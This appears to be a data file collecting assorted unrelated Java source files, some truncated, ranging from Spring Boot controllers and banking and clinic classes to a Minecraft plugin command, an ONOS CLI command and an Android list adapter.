ImageIcon(Server.class.getResource(\"/Images/server.jpg\")));\n\t\tlblNewLabel.setBounds(0, 0, 551, 341);\n\t\tcontentPane.add(lblNewLabel);\n\t}\n\n\t\n\t\n\n\t\n\tclass WaitingClient extends Thread{\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\twhile(true) {\n\t\t\t\t\tsocket = serverSocket.accept();\n\t\t\t\t\tServer.listSK.add(socket);\n\t\t\t\t\tJOptionPane.showMessageDialog(fame, socket +\"is connected to the Server\\n We can chat now\", \"Note\",JOp",
    "package com.enigma.superwallet.dto.response;\n\nimport com.enigma.superwallet.entity.CurrencyHistory;\nimport lombok.*;\n\nimport java.math.BigDecimal;\nimport java.time.LocalDate;\nimport java.time.ZoneId;\nimport java.time.ZonedDateTime;\nimport java.time.format.DateTimeFormatter;\n\n@Getter\n@Setter\n@NoArgsConstructor\n@AllArgsConstructor\n@Builder(toBuilder = true)\npublic class CurrencyHistoryResponse {\n    private String date; // Date in \"yyyy-MM-dd\" format\n    private String baseCurrency;\n    private String targetCurrency;\n    private BigDecimal rate; // BigDecimal format for rate\n\n    public CurrencyHistoryResponse(CurrencyHistory currencyHistory) {\n        this.date = convertUnixTimestampToLocalDate(currencyHistory.getDate()).format(DateTimeFormatter.ofPattern(\"yyyy-MM-dd\"));\n        this.baseCurrency = currencyHistory.getBase();\n        this.targetCurrency = currencyHistory.getCurrency().getCode().name();\n        this.rate = BigDecimal.valueOf(currencyHistory.getRate());\n    }\n\n    private LocalDate convertUnixTimestampToLocalDate(long unixTimestamp) {\n        ZonedDateTime zonedDateTime = ZonedDateTime.ofInstant(java.time.Instant.ofEpochMilli(unixTimestamp), ZoneId.systemDefault());\n        return zonedDateTime.toLocalDate();\n    }\n}\n",
    "package github.com.harriocho.utilities.commands;\n\nimport github.com.harriocho.utilities.utils.Utils;\nimport org.bukkit.Bukkit;\nimport org.bukkit.command.Command;\nimport org.bukkit.command.CommandSender;\nimport org.bukkit.entity.Player;\nimport org.jetbrains.annotations.NotNull;\n\nimport java.util.List;\n\npublic class Gamemodes extends Command {\n    public Gamemodes() {\n        super(\"gamemode\", \"Cambia el modo de juego de los jugadores o de ti mismo\", \"/gamemode [args]\", List.of(\"gm\"));\n    }\n    @Override\n    public boolean execute(@NotNull CommandSender commandSender, @NotNull String s, @NotNull String[] strings) {\n        if (!(commandSender instanceof Player player)) {\n            commandSender.sendMessage(Utils.deniedConsole());\n        } else {\n            if (!player.hasPermission(\"ag.admin\")) {\n                player.sendMessage(Utils.noPermission());\n                return true;\n            }\n            if (strings.length == 0) {\n                player.sendMessage(Utils.parseMessages(\"&cDefine un modo de juego\"));\n                return true;\n            }\n            org.bukkit.GameMode mode = null;\n            try {\n                mode = switch (Integer.parseInt(strings[0])) {\n                    case 0 -> org.bukkit.GameMode.SURVIVAL;\n                    case 1 -> org.bukkit.GameMode.CREATIVE;\n                    case 2 -> org.bukkit.GameMode.ADVENTURE;\n                    case 3 -> org.bukkit.GameMode.SPECTATOR;\n                    default -> null;\n                };\n            } catch (Exception e) {\n                for (org.bukkit.GameMode modes : org.bukkit.GameMode.values()) {\n                    if (modes.name().startsWith(strings[0].toUpperCase())) {\n                        mode = modes;\n                        break;\n                    }\n                }\n            }\n            if (mode == null) {\n                player.sendMessage(Utils.parseMessages(\"&cModo de juego no v\u00e1lido\"));\n                return true;\n            }\n            if (strings.length == 2) {\n                Player target = Bukkit.getServer().getPlayer(strings[1]);\n                if (target != null) {\n                    target.setGameMode(mode);\n                    target.sendMessage(Utils.parseMessages(\"&a\" + player.getName() + \" &eCambi\u00f3 tu modo de juego a \" + mode.name().toLowerCase()));\n                    player.sendMessage(Utils.parseMessages(\"&eCambiaste el modo de juego de &a\" + target.getName() + \" &ea \" + mode.name().toLowerCase()));\n                } else {\n                    player.sendMessage(Utils.parseMessages(\"&cEl jugador no existe\"));\n                }\n                return true;\n            }\n            player.sendMessage(Utils.parseMessages(\"&eCambiaste tu modo de juego a \" + mode.name().toLowerCase()));\n            player.setGameMode(mode);\n\n        }\n        return true;\n    }\n}\n",
    "package app;\n\nimport java.util.Scanner;\n\npublic class CoffeeMachine {\n    private static Scanner scanner = new Scanner(System.in);\n\n    public static void displayMenu() {\n        System.out.println(\"Choose a drink:\");\n        System.out.println(\"1 - Espresso\");\n        System.out.println(\"2 - Cappuccino\");\n        System.out.println(\"3 - Latte\");\n    }\n\n    public static int getUserChoice() {\n        System.out.print(\"Enter your choice: \");\n        while (!scanner.hasNextInt()) {\n            System.out.println(\"Invalid input. Please enter a number.\");\n            scanner.next();\n        }\n        return scanner.nextInt();\n    }\n\n    public static void prepareDrink(int choice) {\n        Beverage beverage;\n        switch (choice) {\n            case 1:\n                beverage = new Espresso();\n                break;\n            case 2:\n                beverage = new Cappuccino();\n                break;\n            case 3:\n                beverage = new Latte();\n                break;\n            default:\n                System.out.println(\"Invalid choice. Please select a valid drink.\");\n                return;\n        }\n        beverage.make();\n    }\n}\n\n",
    "package com.james.api.article;\n\nimport com.james.api.enums.Messenger;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.web.bind.annotation.CrossOrigin;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport java.sql.SQLException;\nimport java.util.*;\n\n@CrossOrigin(origins = \"http://localhost:3000\")\n@RestController\n@RequiredArgsConstructor\npublic class ArticleController {\n    private final ArticleServiceImpl service;\n\n\n    @SuppressWarnings(\"unchecked\")\n    @GetMapping(\"/api/all-articles\")\n    public Map<?,?> findUsers() throws SQLException {\n         Map<String, Object> map = new HashMap<>();\n         map.put(\"message\",Messenger.SUCCESS);\n\n         List<?> list = new ArrayList<>();\n//         list.add(Article.builder()\n//                         .id(1L)\n//                         .title(\"\uc790\ubc14\")\n//                         .content(\"\uc790\ubc14\ub77c\")\n//                         .writer(\"\ud64d\uc131\ub0a8\")\n//                         .registerDate(\"0327\")\n//                 .build());\n         list = service.findAll();\n         list.forEach(System.out::println);\n         System.out.println(\"\ub9ac\uc2a4\ud2b8 \uc0ac\uc774\uc988 : \"+list.size());\n         map.put(\"result\",list);\n         return map;\n    }\n}\n",
    "package clinicSystem;\n\nimport java.util.Objects;\n\npublic class contact {\n    Integer id;\n    String phoneNum;\n    String emailAdress;\n    String location;\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getPhoneNum() {\n        return phoneNum;\n    }\n\n    public void setPhoneNum(String phoneNum) {\n        this.phoneNum = phoneNum;\n    }\n\n    public String getEmailAdress() {\n        return emailAdress;\n    }\n\n    public void setEmailAdress(String emailAdress) {\n        this.emailAdress = emailAdress;\n    }\n\n    public String getLocation() {\n        return location;\n    }\n\n    public void setLocation(String location) {\n        this.location = location;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        contact contact = (contact) o;\n        return Objects.equals(phoneNum, contact.phoneNum) && Objects.equals(emailAdress, contact.emailAdress) && Objects.equals(location, contact.location);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(phoneNum, emailAdress, location);\n\n    }\n\n    @Override\n    public String toString() {\n        return \"contact{\" +\n                \"phoneNum='\" + phoneNum + '\\'' +\n                \", emailAdress='\" + emailAdress + '\\'' +\n                \", location='\" + location + '\\'' +\n                '}';\n    }\n}\n",
    "import java.io.*;\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.Scanner;\r\n\r\nclass Bank {\r\n    private List<Account> accounts;\r\n    private final String dataFilePath = \"accounts.txt\";\r\n\r\n    public Bank() {\r\n        this.accounts = new ArrayList<>();\r\n        loadData();\r\n    }\r\n\r\n    private void loadData() {\r\n        try {\r\n            File file = new File(dataFilePath);\r\n            if (file.exists()) {\r\n                Scanner scanner = new Scanner(file);\r\n                while (scanner.hasNextLine()) {\r\n                    String line = scanner.nextLine();\r\n                    String[] parts = line.split(\",\");\r\n                    String accountNumber = parts[0];\r\n                    String name = parts[1];\r\n                    double balance = Double.parseDouble(parts[2]);\r\n                    accounts.add(new Account(accountNumber, name, balance));\r\n                }\r\n                scanner.close();\r\n            }\r\n        } catch (FileNotFoundException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    private void saveData() {\r\n        try {\r\n            BufferedWriter writer = new BufferedWriter(new FileWriter(dataFilePath));\r\n            for (Account account : accounts) {\r\n                writer.write(account.getAccountNumber() + \",\" + account.getName() + \",\" + account.getBalance());\r\n                writer.newLine();\r\n            }\r\n            writer.close();\r\n        } catch (IOException e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public void createAccount(String accountNumber, String name, double balance) {\r\n        if (!accountExists(accountNumber)) {\r\n            accounts.add(new Account(accountNumber, name, balance));\r\n            saveData();\r\n            System.out.println(\"Account created successfully for \" + name + \" with account number \" + accountNumber + \".\");\r\n        } else {\r\n            System.out.println(\"Account number already exists.\");\r\n        }\r\n    }\r\n\r\n    private boolean accountExists(String accountNumber) {\r\n        for (Account account : accounts) {\r\n            if (account.getAccountNumber().equals(accountNumber)) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n    public void deposit(String accountNumber, double amount) {\r\n        Account account = getAccount(accountNumber);\r\n        if (account != null) {\r\n            account.deposit(amount);\r\n            saveData();\r\n            System.out.println(\"Deposited \" + amount + \" into account \" + accountNumber + \".\");\r\n        } else {\r\n            System.out.println(\"Account not found.\");\r\n        }\r\n    }\r\n\r\n    public void withdraw(String accountNumber, double amount) {\r\n        Account account = getAccount(accountNumber);\r\n        if (account != null) {\r\n            if (account.getBalance() >= amount) {\r\n                account.withdraw(amount);\r\n                saveData();\r\n                System.out.println(\"Withdrew \" + amount + \" from account \" + accountNumber + \".\");\r\n            } else {\r\n                System.out.println(\"Insufficient funds.\");\r\n            }\r\n        } else {\r\n            System.out.println(\"Account not found.\");\r\n        }\r\n    }\r\n\r\n    public void transfer(String fromAccount, String toAccount, double amount) {\r\n        Account from = getAccount(fromAccount);\r\n        Account to = getAccount(toAccount);\r\n        if (from != null && to != null) {\r\n            if (from.getBalance() >= amount) {\r\n                from.withdraw(amount);\r\n                to.deposit(amount);\r\n                saveData();\r\n                System.out.println(\"Transferred \" + amount + \" from account \" + fromAccount + \" to account \" + toAccount + \".\");\r\n            } else {\r\n                System.out.println(\"Insufficient funds.\");\r\n            }\r\n        } else {\r\n            System.out.println(\"One or both accounts not found.\");\r\n        }\r\n    }\r\n\r\n    public void displayBalance(String accountNumber) {\r\n        Account account = getAccount(accountNumber);\r\n        if (account != null) {\r\n            System.out.println(\"Balance for account \" + accountNumber + \": \" + account.getBalance());\r\n        } else {\r\n            System.out.println(\"Account not found.\");\r\n        }\r\n    }\r\n\r\n    private Account getAccount(String accountNumber) {\r\n        for (Account account : accounts) {\r\n            if (account.getAccountNumber().equals(accountNumber)) {\r\n                return account;\r\n            }\r\n        }\r\n        return null;\r\n    }\r\n}\r\n\r\nclass Account {\r\n    private String accountNumber;\r\n    private String name;\r\n    private double balance;\r\n\r\n    public Account(String accountNumber, String name, double balance) {\r\n        this.accountNumber = accountNumber;\r\n        this.name = name;\r\n        this.balance = balance;\r\n    }\r\n\r\n    public String getAccountNumber() {\r\n        return accountNumber;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public double getBalance() {\r\n        return bal",
    "package com.example.demo.controller;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.validation.annotation.Validated;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport com.example.demo.dto.Pagination;\nimport com.example.demo.service.BoardService;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\n@Validated\n@Controller\npublic class BoardController {\n\t@Autowired\n\tprivate BoardService service;\n\t@Autowired\n\tprivate ObjectMapper objectMapper;\n\t\n\t@GetMapping(\"/\")\n\tpublic ModelAndView list(@RequestParam(defaultValue=\"1\")Long pageno) {\n\t\t// \uac80\uc99d\ud588\uc744 \ub54c @RequestParam\uacfc @NotNull, @NotEmpty \ub3d9\uc2dc\uc5d0 \uc0ac\uc6a9 X\n\t\t// \uac80\uc99d\ud560 \uacbd\uc6b0 @NotNull, @NotEmpty\ub97c \uc0ac\uc6a9\ud558\uc790\n\t\t// \ub2e8 \uae30\ubcf8\uac12\uc744 \uc9c0\uc815\ud560 \ub54c\ub294 @RequestParam\n\t\tPagination p = service.findAll(pageno);\n\t\treturn new ModelAndView(\"board/list\").addObject(\"p\",p);\n\t}\n\t\n\t@GetMapping(\"/board/write\")\n\tpublic void write() {\n\t\t\n\t\t\n\t}\n\t\n\t@PostMapping(\"/board/write\")\n\tpublic ModelAndView write(String content) {\n\t\tSystem.out.println(content);\n\t\treturn null;\n\t}\n}\n",
    "import java.sql.Connection;\r\nimport java.sql.DriverManager;\r\nimport java.sql.ResultSet;\r\nimport java.sql.SQLException;\r\nimport java.sql.Statement;\r\n\r\npublic class PatientRecords {\r\n\r\n    public static void main(String[] args) {\r\n\r\n        String dbURL = \"jdbc:mysql://localhost:3306/patient\";\r\n        String username = \"root\";\r\n        String password = \"root\";\r\n\r\n        Connection connection = null;\r\n        Statement statement = null;\r\n        ResultSet resultSet = null;\r\n\r\n        try {\r\n\r\n            Class.forName(\"com.mysql.jdbc.Driver\");\r\n\r\n            connection = DriverManager.getConnection(dbURL, username, password);\r\n\r\n            statement = connection.createStatement();\r\n\r\n            String query = \"SELECT id, name, problem, bill FROM patients\";\r\n\r\n            resultSet = statement.executeQuery(query);\r\n\r\n            System.out.println(\"Patient Records:\");\r\n            while (resultSet.next()) {\r\n                int id = resultSet.getInt(\"id\");\r\n                String name = resultSet.getString(\"name\");\r\n                String problem = resultSet.getString(\"problem\");\r\n                double bill = resultSet.getDouble(\"bill\");\r\n\r\n                System.out.println(\"ID: \" + id);\r\n                System.out.println(\"Name: \" + name);\r\n                System.out.println(\"Problem: \" + problem);\r\n                System.out.println(\"Bill: $\" + bill);\r\n                System.out.println(\"---------------------\");\r\n            }\r\n\r\n        } catch (ClassNotFoundException e) {\r\n            System.out.println(\"Error: MySQL JDBC driver not found!\");\r\n            e.printStackTrace();\r\n\r\n        } catch (SQLException e) {\r\n            System.out.println(\"Error: Connection or query execution failed!\");\r\n            e.printStackTrace();\r\n\r\n        } finally {\r\n\r\n            try {\r\n                if (resultSet != null) {\r\n                    resultSet.close();\r\n                }\r\n                if (statement != null) {\r\n                    statement.close();\r\n                }\r\n                if (connection != null) {\r\n                    connection.close();\r\n                }\r\n            } catch (SQLException e) {\r\n                System.out.println(\"Error: Unable to close resources!\");\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n}\r\n",
    "package com.example.basicbankingsystem;\n\nimport org.springframework.stereotype.Service;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Service\npublic class BankService {\n    private final Map<String, BankAccount> accounts = new HashMap<>();\n\n    public void createAccount(String accountNumber, String ownerName, double initialBalance) {\n        BankAccount account = new SimpleBankAccount(accountNumber, ownerName, initialBalance);\n        accounts.put(accountNumber, account);\n    }\n\n    public BankAccount getAccount(String accountNumber) throws BankException {\n        BankAccount account = accounts.get(accountNumber);\n        if (account == null) {\n            throw new BankException(\"Account not found\");\n        }\n        return account;\n    }\n\n    public void deposit(String accountNumber, double amount) throws BankException {\n        BankAccount account = getAccount(accountNumber);\n        account.deposit(amount);\n    }\n\n    public void withdraw(String accountNumber, double amount) throws BankException {\n        BankAccount account = getAccount(accountNumber);\n        account.withdraw(amount);\n    }\n\n    public void transfer(String senderAccountNumber, String recipientAccountNumber, double amount) throws BankException {\n        BankAccount senderAccount = getAccount(senderAccountNumber);\n        BankAccount recipientAccount = getAccount(recipientAccountNumber);\n        senderAccount.transfer(recipientAccount, amount);\n    }\n}",
    "/*\n * Copyright 2015-present Open Networking Foundation\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.onosproject.cli.net;\n\nimport com.fasterxml.jackson.databind.node.ArrayNode;\nimport org.apache.karaf.shell.api.action.Argument;\nimport org.apache.karaf.shell.api.action.Command;\nimport org.apache.karaf.shell.api.action.Completion;\nimport org.apache.karaf.shell.api.action.lifecycle.Service;\nimport org.onosproject.cli.AbstractShellCommand;\nimport org.onosproject.net.ConnectPoint;\nimport org.onosproject.net.edge.EdgePortService;\nimport org.onosproject.utils.Comparators;\n\nimport java.util.Collections;\nimport java.util.List;\n\nimport static com.google.common.collect.Lists.newArrayList;\nimport static org.onosproject.net.DeviceId.deviceId;\n\n/**\n * Lists all edge ports.\n */\n@Service\n@Command(scope = \"onos\", name = \"edge-ports\",\n        description = \"Lists all edge ports.\")\npublic class EdgePortsListCommand extends AbstractShellCommand {\n\n    private static final String FMT = \"%s/%s\";\n\n    @Argument(index = 0, name = \"uri\", description = \"Device ID\",\n            required = false, multiValued = false)\n    @Completion(DeviceIdCompleter.class)\n    String uri = null;\n\n    @Override\n    protected void doExecute() {\n        EdgePortService service = get(EdgePortService.class);\n        if (uri == null) {\n            printEdgePoints(service.getEdgePoints());\n        } else {\n            printEdgePoints(service.getEdgePoints(deviceId(uri)));\n        }\n    }\n\n    private void printEdgePoints(Iterable<ConnectPoint> edgePoints) {\n        List<ConnectPoint> sorted = sort(edgePoints);\n        if (outputJson()) {\n            ArrayNode result = mapper().createObjectNode().putArray(null);\n            sorted.forEach(e -> {\n                result.add(mapper().createObjectNode()\n                        .put(e.deviceId().toString(), e.port().toString()));\n            });\n            print(\"%s\", result.toString());\n        } else {\n            sorted.forEach(e -> print(FMT, e.deviceId(), e.port()));\n        }\n    }\n\n    private static List<ConnectPoint> sort(Iterable<ConnectPoint> connectPoints) {\n        List<ConnectPoint> edgePoints = newArrayList(connectPoints);\n        Collections.sort(edgePoints, Comparators.CONNECT_POINT_COMPARATOR);\n        return edgePoints;\n    }\n\n}\n",
    "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        int[] massiv0 = new int[5]; //\u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0438 \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438 \u0434\u043b\u044f 5 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\n        //\u043c\u0430\u0441\u0441\u0438\u0432 \u0443\u0436\u0435 \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d 0\n        int[] massiv1 = {12, 16, 13, -8, 7, 9};\n\n        int[] massiv2 = inputArray();\n\n       // printArray(\"\u043c\u0430\u0441\u0441\u0438\u04320 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv0);\n       // printArray(\"\u043c\u0430\u0441\u0441\u0438\u04321 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv1);\n        printArray(\"\u043c\u0430\u0441\u0441\u0438\u04322 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv2);\n       // fillArray(massiv0, 193);\n       // printArray(\"\u043c\u0430\u0441\u0441\u0438\u04320 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv0);\n\n\n//        printArray(\"\u043c\u0430\u0441\u0441\u0438\u04322 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \", massiv2);\n\n    }\n\n    private static void printArray(String message, int[] massiv) {\n        System.out.println(message + massiv.length + \" \u0447\u0438\u0441\u0435\u043b\");\n        for (int i = 0; i < massiv.length; i++) {\n            System.out.println(massiv[i]);\n        }\n    }\n\n    public static void fillArray(int[] m, int filler)\n    {\n        for (int i = 0; i < m.length; i++) {\n            m[i] = filler;\n        }\n    }\n\n    public static void readArray(int[] m)\n    {\n        Scanner scanner = new Scanner(System.in);\n        int value;\n        System.out.println(\"\u0432\u0432\u0435\u0434\u0438\u0442\u0435 \"+m.length+\" \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0430\");\n        for (int i = 0; i < m.length; i++) {\n            value = scanner.nextInt();\n            m[i] = value;\n        }\n    }\n\n    public static int[] inputArray(){\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"\u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0440\u0430\u0437\u043c\u0435\u0440 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 2\");\n        int size = scanner.nextInt();\n        int[] m = new int[size];\n        readArray(m);\n        return m;\n    }\n}",
    "package com.auction.security.config;\n\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.security.web.authentication.www.BasicAuthenticationFilter;\n\n@RequiredArgsConstructor\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    private final UserAuthenticationEntryPoint userAuthenticationEntryPoint;\n    private final UserAuthenticationProvider userAuthenticationProvider;\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        http\n                .exceptionHandling(customizer -> customizer.authenticationEntryPoint(userAuthenticationEntryPoint))\n                .addFilterBefore(new JwtAuthFilter(userAuthenticationProvider), BasicAuthenticationFilter.class)\n                .csrf(AbstractHttpConfigurer::disable)\n                .sessionManagement(customizer -> customizer.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n                .authorizeHttpRequests((requests) -> requests\n                        .requestMatchers(HttpMethod.POST, \"/login\", \"/register\" ,\"/verifyEmail/**\",\"/forgot-password-request/**\",\"/reset-password/**\").permitAll()\n                        .requestMatchers(HttpMethod.GET,\"/verifyEmail/**\").permitAll()\n                        .requestMatchers(\"/moderator/**\" ).hasRole(\"MODERATOR\")\n                        .requestMatchers(HttpMethod.GET,\"/admin\").hasRole(\"ADMIN\")\n                        .requestMatchers(HttpMethod.GET,\"/user\").hasRole(\"USER\")\n                        .anyRequest().authenticated());\n\n\n        return http.build();\n    }\n}\n",
    "/*\n * The Writing is a subclass of the super class Course\n * It Creates a an instance of course that reuses the Course class\n * attributes and methods and overrides the super class' displayInfo \n * method and prints an extra message differentiating it from it's parent \n * class and other sibbling classes.\n */\nclass WritingCourse extends Course {\n     /*\n     * WritingCourse is a constructor, it uses the same parameters as the Course superclass\n     * Inside the constructor, resides super, super is used to refer to the super class'\n     * constructor and methods. This allows the sub-class to invoke the super class' methods\n     */\n    public WritingCourse(String courseCode, String courseName, String courseSubject, int courseCredits){\n        super (courseCode, courseName, courseSubject, courseCredits);\n    }\n\n    /*\n     * The displayInfo method prints two formatted lines.\n     * The first formatted print statement, prints out the Labcourses' code by refering to its\n     * parent's super-class methods (It calls the getClass and getName methods).\n     * The second formatted print statement does the same. It invokes the superclass getSubject \n     * and getCredits methods.\n     * The last print statment, prints a new line with a string differentiating the LabCourse subclass\n     * from a regular course and Writing course.\n     */\n    public void displayInfo() {\n\t\tSystem.out.printf(\"%s: %s %n\", this.getClass(), this.getName());\n\t\tSystem.out.printf(\"%s | %d courseCode %n\", this.getSubject(), this.getCredits());\n        System.out.println(\"This course is a writing course. \\nThis course will satisfies \\\"W-course\\\" requirements\");\n\t}\n}",
    "package com.project_02.newarchitecture.components;\n\nimport com.facebook.jni.HybridData;\nimport com.facebook.proguard.annotations.DoNotStrip;\nimport com.facebook.react.fabric.ComponentFactory;\nimport com.facebook.soloader.SoLoader;\n\n/**\n * Class responsible to load the custom Fabric Components. This class has native methods and needs a\n * corresponding C++ implementation/header file to work correctly (already placed inside the jni/\n * folder for you).\n *\n * <p>Please note that this class is used ONLY if you opt-in for the New Architecture (see the\n * `newArchEnabled` property). Is ignored otherwise.\n */\n@DoNotStrip\npublic class MainComponentsRegistry {\n  static {\n    SoLoader.loadLibrary(\"fabricjni\");\n  }\n\n  @DoNotStrip private final HybridData mHybridData;\n\n  @DoNotStrip\n  private native HybridData initHybrid(ComponentFactory componentFactory);\n\n  @DoNotStrip\n  private MainComponentsRegistry(ComponentFactory componentFactory) {\n    mHybridData = initHybrid(componentFactory);\n  }\n\n  @DoNotStrip\n  public static MainComponentsRegistry register(ComponentFactory componentFactory) {\n    return new MainComponentsRegistry(componentFactory);\n  }\n}\n",
    "package edu.dwacademy.cardatabase;\n\nimport java.util.Arrays;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\nimport edu.dwacademy.cardatabase.domain.AppUser;\nimport edu.dwacademy.cardatabase.domain.AppUserRepository;\nimport edu.dwacademy.cardatabase.domain.Car;\nimport edu.dwacademy.cardatabase.domain.CarRepository;\nimport edu.dwacademy.cardatabase.domain.Owner;\nimport edu.dwacademy.cardatabase.domain.OwnerRepository;\n\n@SpringBootApplication\npublic class CardatabaseApplication implements CommandLineRunner {\n\tprivate static final Logger logger = LoggerFactory.getLogger(\n\t\t\tCardatabaseApplication.class);\n\n\tprivate final CarRepository repository;\n\tprivate final OwnerRepository orepository;\n\tprivate final AppUserRepository urepository;\n\tpublic CardatabaseApplication(CarRepository repository,\n\t\t\t                      OwnerRepository orepository,\n\t\t\t                      AppUserRepository urepository) {\n\t\tthis.repository = repository;\n\t\tthis.orepository = orepository;\n\t\tthis.urepository = urepository;\n\t}\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(CardatabaseApplication.class, args);\n\t\tlogger.info(\"Application started\");\n\t}\n\n\t@Override\n\tpublic void run(String... args) throws Exception {\n\t\tOwner owner1 = new Owner(\"John\" , \"Johnson\");\n\t    Owner owner2 = new Owner(\"Mary\" , \"Robinson\");\n\t    orepository.saveAll(Arrays.asList(owner1, owner2));\n\t\trepository.save(new Car(\"Ford\", \"Mustang\", \"Red\",\n                \"ADF-1121\", 2023, 59000,owner1));\n      repository.save(new Car(\"Nissan\", \"Leaf\", \"White\",\n                \"SSJ-3002\", 2020, 29000,owner2));\n      repository.save(new Car(\"Toyota\", \"Prius\",\n                \"Silver\", \"KKO-0212\", 2022, 39000,owner2));\n      // Fetch all cars and log to console\n      for (Car car : repository.findAll()) {\n          logger.info(\"brand: {}, model: {}\",\n              car.getBrand(), car.getModel());\n      }\n      \n   // Username: user, password: user\n      urepository.save(new AppUser(\"user\",\n          \"$2a$10$wnYMGR9THv9Uo4pCXsKeXuFg0nSdOtHHveEstL/.JyTUeeoRnpdmK\",\"USER\"));\n      // Username: admin, password: admin\n      urepository.save(new AppUser(\"admin\",\n          \"$2a$10$5toLp5vWfyyJNPJ7CNvJ0ON1nx6vveTMKpQQUzHQlw.WDI5ifBRH2\", \"ADMIN\"));\n      \n      \n\t\t\n\t}\n\n}\n",
    "package com.belajar.tugas5recycleview;\n\nimport android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.ImageView;\nimport android.widget.TextView;\nimport androidx.annotation.NonNull;\nimport androidx.recyclerview.widget.RecyclerView;\n\npublic class ItemAdapter extends RecyclerView.Adapter<ItemAdapter.ItemViewHolder> {\n\n    private Context Context;\n    private String[] ItemName;\n    private String[] ItemDescription;\n    private String[] ItemPrice;\n    private int[] ItemImage;\n\n    public ItemAdapter(Context Context, String[] ItemName, String[] ItemDescription, String[] ItemPrice, int[] ItemImage) {\n        this.Context = Context;\n        this.ItemName = ItemName;\n        this.ItemDescription = ItemDescription;\n        this.ItemPrice = ItemPrice;\n        this.ItemImage = ItemImage;\n    }\n\n    @NonNull\n    @Override\n    public ItemViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.list_item, parent, false);\n        return new ItemViewHolder(view);\n    }\n\n    @Override\n    public void onBindViewHolder(@NonNull ItemViewHolder holder, @SuppressLint(\"RecyclerView\") int position) {\n        holder.ImageView.setImageResource(ItemImage[position]);\n        holder.TextName.setText(ItemName[position]);\n        holder.TextDescription.setText(ItemDescription[position]);\n        holder.TextPrice.setText(ItemPrice[position]);\n\n        holder.itemView.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                Intent intent = new Intent(Context, ItemDetailActivity.class);\n                intent.putExtra(\"Name\", ItemName[position]);\n                intent.putExtra(\"Description\", ItemDescription[position]);\n                intent.putExtra(\"Price\", ItemPrice[position]);\n                Context.startActivity(intent);\n            }\n        });\n    }\n\n    @Override\n    public int getItemCount() {\n        return ItemName.length;\n    }\n\n    static class ItemViewHolder extends RecyclerView.ViewHolder {\n        ImageView ImageView;\n        TextView TextName, TextDescription, TextPrice;\n\n        public ItemViewHolder(@NonNull View ItemView) {\n            super(ItemView);\n            ImageView = 